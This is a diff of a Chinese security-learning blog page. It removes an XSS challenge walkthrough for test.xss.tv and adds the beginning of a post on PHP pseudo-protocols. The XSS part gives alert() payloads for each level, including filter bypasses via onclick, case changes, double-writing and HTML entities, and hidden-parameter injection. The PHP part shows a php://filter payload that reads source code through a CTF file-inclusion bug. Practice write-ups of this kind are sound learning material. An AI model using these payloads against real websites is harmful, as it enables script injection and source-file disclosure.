@@ -22,7 +22,7 @@
     <meta name="description" content="Saying and doing are two different things.">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>XSS学习-XSS挑战之旅(一) · Lemon&#39;s blog</title>
+    <title>了解PHP伪协议 · Lemon&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Lemon&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">XSS学习-XSS挑战之旅(一)</a>
+                <a href="#" class="post-name">了解PHP伪协议</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            XSS学习-XSS挑战之旅(一)
+            了解PHP伪协议
             <!-- 404 -->
             
         </h1>
@@ -256,7 +256,7 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                Record my learning process of XSS.
+                Record my learning process of PHP.
             
             <!-- 404 -->
             
@@ -268,18 +268,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="XSS">XSS</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="PHP">PHP</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/04/28</span>
+                    <span class="post-intro-time">2019/08/31</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -403,63 +403,70 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p><strong>练习了DVWA靶场中的XSS了解了一些原理和攻击方式，接下来就用在线XSS平台开始实战一番。</strong></p>
-<p><a href="http://test.xss.tv" target="_blank" rel="noopener">在线XSS平台地址</a><br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/1.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h6><p>用最常用的攻击语句试试。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><strong>第二关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/2.png?raw=true" alt="在这里插入图片描述"><br>就先把这个最简单的攻击语句放上去看看</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>没有出现弹窗，看下页面源代码。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert(/hacker/)&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"搜索"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>观察代码，要想我们的语句起作用，就需要把前面的<code>&lt;input&gt;</code>标签给闭合掉。<br>那就输入这样的语句：<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a><strong>第三关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/3.png?raw=true" alt="在这里插入图片描述"><br>还是那个套路，放上最常用的语句试试<br>没有成功，看看页面源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">'&amp;lt;script&amp;gt;alert(/hacker/)&amp;lt;/script&amp;gt;'</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现输入的&lt;和&gt;被转义了<br>既然过滤了&lt;和&gt;，那就换一种攻击方式，用onclick 事件，onclick 事件会在元素被点击时发生。onclick 事件直接包含在&lt;&gt;内，并且可以被执行。再观察页面源代码，是单引号，那就在前面加<code>&#39;</code>把value给闭合掉。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'onclick='</span>javascript:alert(/hacker/)<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
-<p>输入之后，再点击一下输入框<br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a><strong>第四关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/4.png?raw=true" alt="在这里插入图片描述"><br>先拿一个攻击语句测试下，再看看页面源代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"scriptalert(/hacker/)/script"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>观察到&lt;和&gt;直接被过滤掉了<br>那就用onclick 事件，这里是双引号，那就在前面输入<code>&quot;</code>，把value给闭合掉。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onclick="</span>javascript:alert(/hacker/)<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a><strong>第五关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/5.png?raw=true" alt="在这里插入图片描述"><br>还是那个套路，先输入常用的看看,没有弹窗，看看页面源代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>o_nclick=<span class="string">"javascript:alert(/xss/)"</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现<strong>on</strong>中多了一个下划线，所以过滤了onclick事件，试试<code>script</code>,再看页面源代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>果然，<code>script</code>也同样被过滤了。<br>那就用<code>&lt;a&gt;</code>标签构造攻击语句试试。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(/xss/)<span class="string">"&gt;hacker&lt;/a&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>也可以再后面加上<code>//</code>注释掉后面的<code>&quot;/</code>，以免对前面的语句产生影响。<br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a><strong>第六关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/6.png?raw=true" alt="在这里插入图片描述"><br>输入我们刚才用的语句，看页面源代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>o_nclick=<span class="string">"javascript:alert(/xss/)"</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;a hr_ef=<span class="string">"javascript:alert(/xss/)"</span>&gt;点这里&lt;/a&gt;<span class="comment">//"&gt;</span></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到在这里，<code>href</code>和<code>script</code>、<code>onclick</code>事件都被过滤了。<br>这里过滤的是onclick,改为大写试试。<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ONCLICK="</span>javascript:alert(/hacker/)<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"><br>在浏览博客的时候也看到一个大佬用的<strong>payload</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg x="</span><span class="string">" Onclick=alert(1)&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>利用<code>&lt;svg&gt;</code>标签进行攻击。</p>
-<h6 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a><strong>第七关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/7.png?raw=true" alt="在这里插入图片描述"><br>输入<code>&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;</code><br>查看页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;a =<span class="string">"java:alert(/xss/)"</span>&gt;点这里&lt;/a&gt;<span class="comment">//"&gt;</span></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure></p>
-<p>输入<code>&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;</code><br>查看页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;&gt;alert(/hacker/)&lt;/&gt;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这次更狠，直接把关键字给过滤没了<br>用双写绕过<br><strong>payload：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>过滤掉中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。<br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a><strong>第八关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/8.png?raw=true" alt="在这里插入图片描述"><br>输入<code>&quot;onclick=&quot;javascript:alert(/hacker/)&quot;</code><br>发现href,script被过滤，就试试onclick事件。<br><strong>页面源代码：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"&amp;quot;onclick=&amp;quot;javascript:alert(/hacker/)&amp;quot;"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现<code>&quot;</code>,<code>&lt;</code>,<code>&gt;</code>也被转义了。<br>再次观察源代码，发现友情链接。。。真的是提示，这不就是<code>&lt;a&gt;</code>标签绕过吗?<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"javascript:alert(1)"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">"javascr_ipt:alert(1)"</span>&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
-<p>既然下面有<code>&lt;a&gt;</code>标签，那我们就直接输入这个语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/hacker/)</span><br></pre></td></tr></table></figure></p>
-<p>但是<code>script</code>会被过滤，换一种方式表达<code>script</code><br>采用HTML字符实体转换<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">地址</a><br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/9.png?raw=true" alt="在这里插入图片描述"><br>方法一：<br><strong>payload：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/10.png?raw=true" alt="在这里插入图片描述"><br>参考大佬的<strong>payload:</strong><br>方法二：用 html 的自解码机制就可以绕过<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#<span class="number">114</span>;ipt:alert(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
-<p>方法三：可以全转换为HTML实体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">41</span>;</span><br></pre></td></tr></table></figure></p>
-<h6 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a><strong>第九关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/11.png?raw=true" alt="在这里插入图片描述"><br>又是友情链接，把刚才的语句输入进去，查看页面源代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">"java&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:alert(/hacker/)"</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">"您的链接不合法？有没有！"</span>&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
-<p>我们输入的语句并没有进入到 <code>&lt;a&gt;</code>标签中，这里应该对格式有一定要求，查看大佬的博客后发现需要添加<code>http://</code>,否则不合法。<br><strong>payload：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)<span class="comment">//http://</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"><br>第九关和第八关类似，区别就是第九关添加了url验证合法性。</p>
-<h6 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a><strong>第十关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/12.png?raw=true" alt="在这里插入图片描述"><br>这次更狠，连个输入框都不给。那就先看一下页面源代码吧</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-<p>一脸懵，不知道该如何下手了,只能去查看大佬的wp了。<br><strong>先测试测试哪个可以注入</strong><br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/13.png?raw=true" alt="在这里插入图片描述"><br>查看页面源代码，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">""</span>text<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure></p>
-<p>找到了，<strong>t_sort</strong>就是注入点，那就开始注入吧<br>代码中有隐藏的参数设置,把hidden改为text<br><strong>payload：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=<span class="string">"onclick="</span>alert(/hacker/)<span class="string">"type="</span>text<span class="string">"</span></span><br></pre></td></tr></table></figure></p>
-<p>也可以<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=<span class="string">" type="</span>text<span class="string">" onclick="</span>alert(/hacker/)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/wanchen.png?raw=true" alt="在这里插入图片描述"></p>
-<h6 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a><strong>第十一关</strong></h6><p><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/14.png?raw=true" alt="在这里插入图片描述"><br>还没有输入框，那类型应该和第十关比较类似，先看页面源代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_ref"</span>  value=<span class="string">"http://test.xss.tv/level10.php?keyword=well%20done!&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(1)"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-<p>一样的方法，先测试一下看那个可以注入<br><img src="https://github.com/bealright/bealright.github.io/blob/master/XSSS/15.png?raw=true" alt="在这里插入图片描述"><br>查看页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"3"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_ref"</span>  value=<span class="string">""</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发现了<strong>t_sort</strong>是可以注入的，把刚才的payload拿来试试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"&amp;quot;onclick=&amp;quot;alert(/hacker/)&amp;quot;type=&amp;quot;text&amp;quot;"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发现<code>&quot;</code>被转义了，把<code>&quot;</code>转化为HTML实体也不行。查大佬的wp吧<br>发现做到这一关需要<strong>burpsuite抓包工具</strong>来帮忙,所以先做到这里,等到会用抓包工具了，再回过头来继续做。</p>
-<p>未完待续————————</p>
+        <p><strong>前言：最近做题web题很多都涉及了PHP伪协议，这次就来详细的了解总结一下！</strong></p>
+<hr>
+<p>练习每个协议前，相关的配置必须开启或者关闭才不会报错，可以参考这张图片<br><img src="http://img-blog.csdnimg.cn/20190825104423570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面就来了解PHP伪协议</p>
+<h2 id="php"><a href="#php" class="headerlink" title="php://"></a><strong>php://</strong></h2><p>说明：</p>
+<blockquote>
+<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 </p>
+</blockquote>
+<p><code>php://</code>  访问输入输出流，有许多子协议,下面就来学习一下</p>
+<h4 id="一-php-filter"><a href="#一-php-filter" class="headerlink" title="(一)php://filter"></a><strong>(一)php://filter</strong></h4><p>说明：</p>
+<blockquote>
+<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 </p>
+</blockquote>
+<p>简单来理解就是：<code>php://filter</code>是可以作为一个中间流来处理其他流，可以进行任意文件的读取。而且当使用不同的参数可以达到不同的目的和效果：<br><img src="http://img-blog.csdnimg.cn/20190824111041940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子可以看PHP官网，特别详细<br><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://filter</a></p>
+<p>这里通过<strong>bugku</strong>中的一道题来练习一下<br><img src="http://img-blog.csdnimg.cn/20190824112004687.png" alt="在这里插入图片描述"><br>打开链接后发现<code>?file=show.php</code>，涉及文件包含漏洞，题目中又提示说：flag在index中，那就可以用<code>php://filter</code>中的<code>read</code>参数查看源文件内容</p>
+<p>构造payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+<p>这里之所以进行base64编码是为了PHP不对其解析,这个payload也是常用的任意读取文件语句，只要将后面的页面修改即可。</p>
+<p>可以参考官网的例子构造语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 这会以大写字母输出 www.example.com 的全部内容 */</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.toupper/resource=http://www.example.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这会和以上所做的一样，但还会用 ROT13 加密。 */</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.toupper|string.rot13/resource=http://www.example.com"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190824113413640.png" alt="在这里插入图片描述"><br>解码得出源代码和flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到源代码中对用户输入的<code>file</code>参数进行了过滤，但是源码中的<code>include</code>函数将用户输入的引入php文件并执行，如果执行不成功，就返回文件的源码，所以才要进行base64编码。</p>
+<h4 id="二-php-input"><a href="#二-php-input" class="headerlink" title="(二)php://input"></a>(二)php://input</h4><p>说明：</p>
+<blockquote>
+<p>php://input 是个可以访问请求的原始数据的只读流，可以读取没有处理过的POST数据。</p>
+</blockquote>
